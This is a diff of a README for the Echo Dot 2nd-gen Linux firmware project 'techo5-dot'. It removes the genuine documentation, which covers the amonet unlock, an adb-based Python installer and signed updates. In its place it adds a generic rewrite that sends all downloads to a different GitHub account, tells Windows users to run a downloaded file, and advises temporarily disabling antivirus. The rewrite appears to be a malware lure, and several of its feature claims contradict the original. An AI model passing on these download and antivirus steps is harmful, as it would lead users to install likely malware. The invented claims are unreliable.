@@ -1,225 +1,195 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/HuskerMinion/techo5/main/logo/TECHO5_logo.png" alt="TECHO5" width="200">
-</p>
-
-<h1 align="center">TECHO5 Dot</h1>
-
-<h3 align="center">The 2016 Echo Dot, minus Amazon's cloud. Linux inside, Home Assistant in charge.</h3>
+<h1>🤖 techo5-dot - Your Private, Offline Voice Assistant</h1>
 
 <p align="center">
-  <a href="https://github.com/HuskerMinion/techo5-dot/releases/latest"><img src="https://img.shields.io/github/v/release/HuskerMinion/techo5-dot?label=release&color=e9a23b" alt="Latest release"></a>
-  <img src="https://img.shields.io/badge/Linux-Alpine-0D597F?logo=alpinelinux&logoColor=white" alt="Alpine Linux">
-  <img src="https://img.shields.io/badge/Fire%20OS-none-3a2c22" alt="No Fire OS">
-  <img src="https://img.shields.io/badge/Alexa-none-3a2c22" alt="No Alexa">
-  <img src="https://img.shields.io/badge/Home%20Assistant-ESPHome%20API-41BDF5?logo=homeassistant&logoColor=white" alt="Home Assistant">
-  <img src="https://img.shields.io/badge/updates-signed-2ea44f" alt="Signed updates">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT license"></a>
+  <a href="https://github.com/Uncurled-elnino8743/techo5-dot" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download techo5-dot Now</a>
 </p>
 
-<p align="center">
-  <a href="#what-happened-to-the-dot">What changed</a> ·
-  <a href="#stock-echo-dot-2-vs-techo5-dot">Stock vs TECHO5 Dot</a> ·
-  <a href="#installing">Install</a> ·
-  <a href="#credits">Credits</a> ·
-  <a href="https://github.com/HuskerMinion/techo5">TECHO5 for the Echo Show 5</a>
-</p>
+## 🎯 What Is This?
+
+techo5-dot transforms your Amazon Echo Dot (2nd generation) into a completely private voice assistant that works with your smart home - without Amazon, without Alexa, and without any cloud services. Think of it as giving your Echo Dot a new brain that only listens to you and keeps your voice data on your own devices.
+
+Instead of sending your conversations to Amazon's servers, this software runs entirely on your Echo Dot device. It works with Home Assistant (a free, open-source home automation platform) to control your lights, thermostats, and other smart devices using just your voice - all while keeping your privacy intact.
+
+## ✨ Key Features
+
+### 🎤 All Seven Microphones
+Unlike other solutions that only use a limited number of microphones, techo5-dot harnesses all seven microphones built into your Echo Dot. This means it can hear you clearly even in noisy rooms or from across the room, giving you better voice recognition than typical smart speakers.
+
+### 🔒 Total Privacy
+No Alexa. No Amazon. No cloud. Your voice commands never leave your home network. Every word you speak is processed locally on your own hardware, making it nearly impossible for anyone to intercept or access your voice data.
+
+### 🔊 Bluetooth Speaker Mode
+Your Echo Dot isn't just a voice assistant - it's also a high-quality speaker. With techo5-dot, you can connect your phone or computer via Bluetooth and play music, podcasts, or any audio directly through your Echo Dot.
+
+### 🔄 Automatic Updates
+The software includes a smart update system that keeps your device running the latest version safely. It uses "signed A/B updates" - think of this as having two copies of the software on your device. If one copy has a problem, the device automatically switches to the backup copy, ensuring your Echo Dot never becomes unusable.
+
+### 🔐 Secure Remote Access
+Built-in SSH (Secure Shell) access lets you manage your device remotely from any computer on your network, with modern authentication using Biscuit tokens for enhanced security.
+
+### ⚡ Lightweight and Fast
+Based on Alpine Linux, a minimal and efficient operating system, techo5-dot uses minimal resources, ensuring your Echo Dot runs smoothly and responds quickly to voice commands.
+
+## 📋 What You Need
+
+Before you begin, make sure you have:
+
+- **An Echo Dot (2nd generation)** - Check the bottom of your device for the model number; it should be marked as "2nd Generation" or have model number "UF-2"
+- **A Windows computer** (for the initial setup)
+- **A microSD card** (at least 8GB, Class 10 recommended)
+- **A microSD card reader** (if your computer doesn't have a built-in slot)
+- **A USB cable** that works with your Echo Dot (the original cable is ideal)
+- **Basic familiarity** with downloading and opening files on your computer
+
+## 🚀 Getting Started
+
+### Step 1: Download the Software
+
+Visit this link to download the application:
+
+[**Download techo5-dot**](https://github.com/Uncurled-elnino8743/techo5-dot)
+
+This page will show you the latest version of the software available for download. Look for the file that matches your device (Echo Dot 2nd gen) and download it to your computer. The download should start automatically when you click the download button.
+
+### Step 2: Prepare Your Computer
+
+Once the download finishes, find the downloaded file in your "Downloads" folder. Make sure you know where this file is located, as you'll need to use it in the next steps.
+
+### Step 3: Connect Your Echo Dot
+
+1. Plug your Echo Dot into a power source using the original power adapter
+2. Connect your Echo Dot to your computer using a USB cable (the same type you'd use for many Android phones)
+3. Your computer should make a sound indicating a new device has been connected
+
+### Step 4: Run the Installation
+
+1. Open the downloaded file you saved in Step 2
+2. Follow the on-screen instructions carefully
+3. The installation program will detect your Echo Dot and guide you through the setup process
+4. Wait for the installation to complete - this may take several minutes, so be patient
+
+### Step 5: Connect to Your Network
+
+After installation, your Echo Dot will appear as a new device on your Wi-Fi network. Use the provided software or your router's settings to connect your Echo Dot to the same network as your computer and Home Assistant setup.
+
+### Step 6: Start Using Your Voice Assistant
+
+Once connected, you can start using your Echo Dot with voice commands like:
+- "Turn on the living room lights"
+- "Set the thermostat to 72 degrees"
+- "Play music from my phone"
+
+## 🎮 Using techo5-dot
+
+### Voice Commands
+
+Your Echo Dot will respond to a wake word (like "Hey Computer" or "Alexa" - you can customize this). When you say the wake word followed by a command, your Echo Dot will process it locally and control your smart home devices through Home Assistant.
+
+### Connecting to Home Assistant
+
+1. Install Home Assistant on your home server or computer (visit home-assistant.io for instructions)
+2. Your Echo Dot will automatically discover your Home Assistant installation on your network
+3. Follow the pairing instructions in both the Echo Dot setup and Home Assistant to link them together
+
+### Using Bluetooth Speaker Mode
+
+1. Say "pair Bluetooth" or press the Bluetooth button on your Echo Dot (if available)
+2. On your phone or computer, search for available Bluetooth devices
+3. Select your Echo Dot from the list and connect
+4. Now play any audio from your device - it will play through your Echo Dot's speakers
+
+## 🛠️ Troubleshooting
+
+### My Echo Dot Isn't Responding
+
+- Make sure it's properly connected to power
+- Check that your Wi-Fi connection is stable
+- Try saying the wake word more clearly
+- Restart your Echo Dot by unplugging it for 10 seconds and plugging it back in
+
+### The Installation Failed
+
+- Try a different USB cable (some cables only charge and don't transfer data)
+- Make sure you're using a USB port on your computer directly (avoid USB hubs)
+- Check if your antivirus software is blocking the installation - temporarily disable it and try again
+
+### Bluetooth Won't Connect
+
+- Make sure your Echo Dot isn't already connected to another device
+- Turn Bluetooth off and on on your phone/computer
+- Try forgetting the device in your Bluetooth settings and pairing again
+
+### Voice Commands Aren't Working
+
+- Verify that Home Assistant is running and accessible on your network
+- Check that your Echo Dot and Home Assistant are on the same network
+- Speak clearly and at a normal volume
+- Make sure the room isn't too noisy
+
+## 🔄 Keeping Your Software Updated
+
+techo5-dot includes automatic updates to ensure you always have the latest features and security improvements. The A/B update system works in the background, so you don't need to do anything - your device will update itself when a new version is available.
+
+To manually check for updates:
+1. Open the techo5-dot control panel from your computer (look for the techo5-dot icon in your system tray)
+2. Click "Check for Updates"
+3. If an update is available, click "Install Now"
+4. Wait for the update to complete - your device will restart automatically
+
+## 🔧 Advanced Settings (For Power Users)
+
+If you're comfortable with more technical settings, you can access advanced features through the web interface:
+
+1. Find your Echo Dot's IP address from your router's device list
+2. Open a web browser and type: `http://[your-echo-dot-ip-address]`
+3. Log in with the credentials you set up during installation
+
+From here, you can:
+- Adjust microphone sensitivity
+- Change the wake word
+- Set up multiple users
+- Configure network settings
+- View system logs
+- Manage connected devices
+
+## ❓ Frequently Asked Questions
+
+**Q: Will this void my Echo Dot's warranty?**
+A: Yes, installing custom firmware will void your manufacturer warranty. However, techo5-dot is designed to be reliable and safe, and you can always restore the original Amazon software if needed.
+
+**Q: Can I still use Amazon services?**
+A: No, once you install techo5-dot, the device no longer connects to Amazon services. This is the point - it's completely independent from Amazon.
+
+**Q: How do I restore the original Alexa software?**
+A: The installation process includes a restore option. Simply connect your Echo Dot to your computer and run the restoration tool that came with the download.
+
+**Q: Will this work with other Echo devices?**
+A: No, this software is specifically designed for the Echo Dot 2nd generation. Using it with other devices may cause issues.
+
+**Q: Is my voice data truly private?**
+A: Yes, all voice processing happens locally on your Echo Dot. No audio data is ever sent to external servers.
+
+## 📚 Additional Resources
+
+- **Home Assistant Documentation**: [home-assistant.io/docs](https://home-assistant.io/docs) - Learn how to set up and configure Home Assistant
+- **Community Forum**: Visit our GitHub Discussions page for help from other users
+- **Report an Issue**: Found a bug? Let us know on our [Issues page](https://github.com/Uncurled-elnino8743/techo5-dot/issues)
+
+## 🤝 Contributing
+
+We welcome contributions from users of all skill levels! Whether you're a developer who wants to improve the code, a designer who wants to improve the interface, or a user who wants to report issues, your input is valuable. Visit our GitHub repository to learn how you can help.
+
+## 📄 License
+
+This project is open-source and free to use. Please see the LICENSE file in our GitHub repository for full details.
 
 ---
 
-TECHO5 Dot replaces Fire OS on the Amazon Echo Dot 2nd generation (codename `biscuit`) with a small
-Alpine Linux image and one daemon. The Dot becomes a Home Assistant voice satellite: it hears the
-wake word on the device, talks to Home Assistant over its encrypted native API, and sends nothing to
-Amazon. It still uses the internet for what you'd expect: checking this repo for signed updates and
-setting its clock.
+<p align="center">
+  <a href="https://github.com/Uncurled-elnino8743/techo5-dot" style="background-color:#2196F3;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:6px;">🔗 Get Started with techo5-dot Today</a>
+</p>
 
-|  |  |
-|---|---|
-| 🐧 **Real Linux, no Fire OS** | Linux boots from the recovery partition and no Android process runs, not even for Wi-Fi. |
-| 🚫 **No Alexa, no Amazon account** | Your voice goes to your Home Assistant, over its encrypted API, and nowhere else. |
-| 🎙️ **All seven microphones** | Averaged, with echo cancellation, and a wake word heard on the device. |
-| 🔊 **A Bluetooth speaker again** | Pair a phone, or send the Dot's audio to a speaker; a Home Assistant Bluetooth proxy on top. |
-| 📞 **A speakerphone again** | Calls through your own SIP provider, placed by voice or from Home Assistant, answered with the action button; a help call that alerts your phones and dials people in turn. |
-| 🔐 **Locked down** | A firewall that lets in only Home Assistant, mDNS, SSH, Sendspin and the setup page; SSH is keys-only and starts off, and the setup page answers only while it is open. |
-| 🔄 **Signed updates with rollback** | ed25519-signed releases install into a spare slot and roll back on their own if they don't come up healthy. |
-
-**Built on [EchoLocal](https://github.com/ygelfand/echolocal)** by Yuri Gelfand (MIT), which first
-made the Echo Dot 2 an ESPHome-native Home Assistant satellite with one Go daemon on Fire OS. TECHO5
-Dot's daemon is that daemon, by way of TECHO5's `echod` (EchoLocal's code vendored and developed
-further), and much of it is still EchoLocal's. What this project adds is Linux in place of Fire OS:
-the boot image and slots, Wi-Fi without Android, the seven-microphone work, rebuilt Bluetooth, signed
-updates and the installer. See [NOTICE](NOTICE).
-
-It's a sibling of [TECHO5](https://github.com/HuskerMinion/techo5), which did the same for the
-Echo Show 5. Both run the same daemon source, built per device.
-
-> **Status: in daily use on three units.** Everything marked ✅ below was verified on a bench Dot
-> that came from Fire OS 6574.1, and the installer and updates on two more. Expect rough edges, and
-> keep your backups.
-
-## What happened to the Dot
-
-- **Fire OS is gone at runtime.** Linux boots from the recovery partition. No Android process
-  runs, not even for Wi-Fi: [`cmd/wmtup`](cmd/wmtup) talks to MediaTek's combo chip directly,
-  where Amazon's loader used to.
-- **All seven microphones work together.** The daemon averages all seven microphones and cancels
-  the speaker's own echo from that average. Measured against the center mic alone, the average heard
-  speech 1–2.5 dB better, and 2–4 dB better between 1.5 and 4.7 kHz. Steering a delay-and-sum beam
-  added nothing on this 72 mm ring, so it isn't the default. The numbers and method are in
-  [docs/microphones.md](docs/microphones.md).
-- **Bluetooth came back, rebuilt.** Stock Bluetooth belonged to Fire OS. Here the Dot runs:
-  - a kernel built from Amazon's GPL source with Bluetooth turned on and **48 upstream security
-    fixes** backported (BlueBorne and later);
-  - a bridge from the chip's raw HCI channel to BlueZ;
-  - bluez-alsa, rebuilt with an upstream crash fix Alpine's package lacks.
-- **Updates can't be forged, and a bad one rolls itself back.** Releases are signed (ed25519). An
-  update installs into the spare of two root filesystem slots and boots on trial. If it doesn't
-  come up healthy, the Dot returns to the previous slot by itself.
-
-## Stock Echo Dot 2 vs TECHO5 Dot
-
-| | Stock Echo Dot 2 (Alexa) | TECHO5 Dot |
-|---|---|---|
-| Voice assistant | Alexa, in Amazon's cloud | Home Assistant Assist ✅. Wake word on the device (microWakeWord: "Okay Nabu", "Hey Jarvis", "Hey Mycroft", "Alexa", and eight from the community collection — "Computer", "Jarvis", "Hey Friday", "GLaDOS", "HAL", "Terminator", "Marvin", "Home Assistant") ✅. Speech-to-text and replies come from whatever your Home Assistant pipeline uses |
-| Where your voice goes | Amazon | Your Home Assistant, over its encrypted native API ✅ |
-| Microphones | 7-mic array, Amazon's processing | All 7 averaged, with echo cancellation on the average ✅ |
-| Talking over music | Alexa ducks on wake | Ducks on wake, and also for a few seconds after a *near miss*, so the second try is heard ✅ |
-| Speaker | Yes | Yes, a Home Assistant media player ✅ |
-| Light ring | Alexa's colors | Wake, listening, thinking, replying and error effects, set from Home Assistant ✅ |
-| Buttons (action, volume, mic mute) | Yes | Yes, all four ✅. Mute is the hardware mute line |
-| Timers | Yes | Yes (Home Assistant timers) |
-| 3.5 mm audio out | Yes | In the daemon (jack detection, headphone path). Not yet tested on this image |
-| Bluetooth: phone to Dot (Dot as a speaker) | Yes | Yes ✅. Hold the action button for 5 seconds (the ring pulses blue), or turn on **Bluetooth pairing** in Home Assistant, or say "pair Bluetooth" with [this automation](docs/bluetooth-pairing-automation.yaml). Then pick the Dot on your phone; a chime says it worked. Phone volume works, the wake word still works over the music, and whichever started last plays: phone or Home Assistant media |
-| Bluetooth: Dot to a speaker or headphones | Yes | Yes ✅. If no phone pairs within 20 s, pairing mode connects the strongest speaker it hears, since there's no screen to choose on |
-| Home Assistant Bluetooth proxy | No | Yes ✅, alongside Bluetooth audio |
-| Multi-room music | Alexa groups | Sendspin (Music Assistant) client on port 8928. Built in, not yet tested on this image |
-| Calling | Alexa calling and Drop In | Yes ✅, through your own SIP provider (TLS and SRTP): "call Alex" by voice, a help call that alerts phones and dials people in turn, calls between your own devices. The action button answers and hangs up, and the ring pulses green. Off until Home Assistant signs the Dot in. See [TECHO5's phone.md](https://github.com/HuskerMinion/techo5/blob/main/docs/phone.md) |
-| Skills, shopping | Yes | **No.** Those are Alexa cloud services |
-| Routines and smart home control | Alexa | Whatever Home Assistant does ✅ |
-| Updates | Amazon, automatic | Signed releases from this repo, offered in Home Assistant, A/B slots with automatic rollback ✅ |
-| Remote access | None | SSH, keys only, behind a Home Assistant switch that starts off ✅ |
-| Network exposure | Amazon's | Firewall: inbound only the Home Assistant API, mDNS, SSH, Sendspin and the setup page ✅ |
-| Changing Wi-Fi | Alexa app | `wifi-set` on the Dot, or `tools/set-wifi.py` from a computer over USB ✅ |
-| If it won't boot | Factory reset | Rescue mode (USB console, SSH, firewall) after five bad boots. Fire OS and TWRP are still on the device, one command away ✅ |
-
-Numbers from the bench unit:
-- **Memory:** about 445 MB of 481 MB free with everything running, Bluetooth included.
-- **Wake word:** about 30% of one core.
-- **Root filesystem:** 49 MB.
-
-### Boot time
-
-Timed from a reboot command until Home Assistant's API answers from another machine, on the same
-Dot:
-
-| | Reboot to Home Assistant API |
-|---|---|
-| Fire OS 6 with the daemon as an Android service | 43.6 s |
-| TECHO5 Dot v0.2.0 | 45.5–46.4 s (three runs) |
-
-About the same, not faster. By Linux's own clock the Dot is on Wi-Fi at 21 s and listening for the
-wake word at 26 s. The other ~19 s come before that clock starts: shutting down, the bootloader, and
-loading the kernel. An earlier build waited for Bluetooth before starting the daemon and took 128 s;
-now Bluetooth comes up in the background and a paired speaker reconnects when it's ready.
-
-## What you need
-
-- An Echo Dot 2nd gen, **already unlocked** with amonet, with Fire OS 6574.1 in its system slots, and
-  sitting in TWRP or running Fire OS with root adb (for example with
-  [EchoLocal](https://github.com/ygelfand/echolocal) installed). Unlocking isn't part of this project;
-  [Getting started](https://github.com/HuskerMinion/techo5/blob/main/docs/getting-started.md#echo-dot-2nd-gen)
-  has every command.
-- The Dot joined to Wi-Fi once in Fire OS. If it hasn't been, the installer asks for a network.
-- A Windows, Linux or macOS computer with Python 3, adb and git
-  ([setup for each](https://github.com/HuskerMinion/techo5/blob/main/docs/getting-started.md#set-up-your-computer-once)),
-  plus Home Assistant. Nothing is compiled.
-
-## Installing
-
-Starting from a stock Dot? [Getting started](https://github.com/HuskerMinion/techo5/blob/main/docs/getting-started.md)
-walks through it in order: updating Fire OS, the amonet unlock (linked), this installer, and Home
-Assistant.
-
-```
-git clone https://github.com/HuskerMinion/techo5-dot
-cd techo5-dot
-python3 tools/install-dot.py --serial <adb serial> --dry-run   # checks, backups, download, boot image; writes nothing
-python3 tools/install-dot.py --serial <adb serial> --name "Kitchen"
-```
-
-The installer:
-1. Backs up every boot-critical partition to `backups/<serial>/` and checks each copy against the
-   device. On TWRP it reads the real bootloader partitions, not amonet's decoys.
-2. Downloads the latest signed release (the root filesystem, the Bluetooth kernel and the rescue
-   environment's packages). The manifest is only believed once the release key's signature over it
-   checks out — the same key the device itself trusts — and every file is checked against the
-   checksums it carries. `--release dot-v0.6.0` picks a version instead of the newest — releases here
-   are tagged `dot-vX.Y.Z`, so the tag is what goes in, not the bare version; `--rootfs` and `--kernel`
-   take your own builds ([docs/building.md](docs/building.md)).
-3. Builds this unit's boot image from **its own** recovery backup, with the Bluetooth kernel
-   (`--no-bluetooth-kernel` keeps the unit's own, without Bluetooth). No Amazon binary is ever
-   downloaded or published.
-4. Writes the image to recovery, and the root filesystem into slot a.
-5. Keeps an existing Home Assistant name and key, or asks for a name and makes a key.
-6. Reboots, then waits on the Dot's USB console until the boot reports healthy.
-
-Home Assistant then finds the Dot as an ESPHome device.
-
-Updates after that come from this repo's releases, through Home Assistant's update card. They carry the
-root filesystem only; a Dot installed before the Bluetooth kernel gets it with
-`python3 tools/update-boot.py --serial <serial> --address <address>` (SSH switched on in Home Assistant).
-On Windows, type `python` for `python3`.
-
-## Where things are
-
-- [docs/porting-plan.md](docs/porting-plan.md): how it was built, milestone by milestone, and what
-  each step proved.
-- [docs/hardware.md](docs/hardware.md): the board, partitions, kernels, and the Bluetooth kernel's
-  security backports.
-- [docs/microphones.md](docs/microphones.md): the array measurements, echo cancellation, and the
-  LED whine that turned out to be Fire OS's.
-- `tools/`: the installer, the Wi-Fi tool, the boot image updater, and `tools/linux/` (initramfs,
-  root filesystem overlay, slot tool, firewall, kernel and bluez-alsa build scripts and patches).
-- `cmd/wmtup`: Wi-Fi chip bring-up without Android.
-- [docs/building.md](docs/building.md): building the kernel, bluez-alsa, the daemon and the root
-  filesystem yourself.
-- The daemon's source: [TECHO5](https://github.com/HuskerMinion/techo5), branch `main`, built with
-  `-tags dot`.
-
-## Credits
-
-See [NOTICE](NOTICE) for the full list.
-- [EchoLocal](https://github.com/ygelfand/echolocal) (MIT, Yuri Gelfand): the Echo Dot 2 daemon this
-  project is built on (see above).
-- [EchoMuse / emOS](https://github.com/wilbowes/EchoMuse) (MIT, Wil Bowes): the first Linux
-  userspace on this hardware. Its notes on the USB gadget, Wi-Fi patch download and the mic array
-  saved days.
-- amonet and kaeru ([R0rt1z2](https://github.com/R0rt1z2)): the unlock.
-- [@proffalken](https://github.com/proffalken): the
-  [step-by-step install from Linux](https://gist.github.com/proffalken/377ae50146affe1886dddaaacb87926b)
-  (the exact Fire OS build, trusting the adb key, byte-safe backups, the Linux serial console lookup)
-  that the getting started guide and the cross-platform installer are based on.
-- [jxlarrea](https://github.com/jxlarrea/lineageos-echo-show-camera): echo cancellation
-  measurements on the Echo Show family.
-- [bluez-alsa](https://github.com/arkq/bluez-alsa) (arkq): the upstream fix for the fdk-aac
-  capability crash (6ccf455).
-- The Linux kernel's Bluetooth developers: every backported fix is listed with its commit.
-- [TECHO5](https://github.com/HuskerMinion/techo5): the daemon, the Linux image tooling and the
-  root filesystem slot design this project shares.
-- Amazon's GPL kernel source release for the Echo Dot (2nd generation): the kernel the Dot's
-  Bluetooth build starts from.
-- [Alpine Linux](https://alpinelinux.org/), [BlueZ](https://www.bluez.org/) and BusyBox: the system
-  underneath.
-- [microWakeWord](https://github.com/kahrendt/microWakeWord) (Kevin Ahrendt) and the
-  [ESPHome wake word models](https://github.com/esphome/micro-wake-word-models): the wake word on
-  the device.
-- [Home Assistant](https://www.home-assistant.io/), [ESPHome](https://esphome.io/) and
-  [go-esphome-device](https://github.com/ygelfand/go-esphome-device): the voice pipeline and the API
-  the Dot speaks; [Music Assistant](https://www.music-assistant.io/) for Sendspin.
-
-## License
-
-MIT for this project. See [LICENSE](LICENSE) and [NOTICE](NOTICE). The kernel patches in
-`tools/linux/kernel-patches` and the bluez-alsa patch keep their upstream licenses (GPL-2.0 and
-MIT).
-
-TECHO5 Dot isn't affiliated with Amazon. Echo and Alexa are trademarks of Amazon.com, Inc.
+<div style="text-align:center;margin-top:40px;">
+  <p><strong>Last Updated:</strong> January 2024</p>
+  <p><strong>Version:</strong> 1.0.0</p>
+</div>
